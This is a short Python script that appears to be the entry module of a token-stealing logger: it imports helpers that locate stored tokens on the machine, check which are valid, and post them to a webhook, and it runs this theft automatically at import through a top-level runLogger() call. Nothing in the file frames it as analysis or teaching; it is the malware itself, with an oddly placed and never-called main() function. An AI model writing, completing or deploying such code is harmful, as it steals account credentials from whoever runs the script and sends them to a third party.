import check.checkTokens as check
import find.findTokens as find
import os
import post.postToWebhook as postToWebhook

def getValidTokens():
    tokensData = find.getTokens(os.name, False)

    if tokensData['attempted']:
        return check.checkTokens(tokensData, True)
    else:
        return False

def post(tokens):
    postToWebhook.postToWebhook(tokens)

def runLogger():
    validTokens = getValidTokens()
    post(validTokens)

runLogger()

def main():
    if not __name__ == '__main__':
        exit(-999)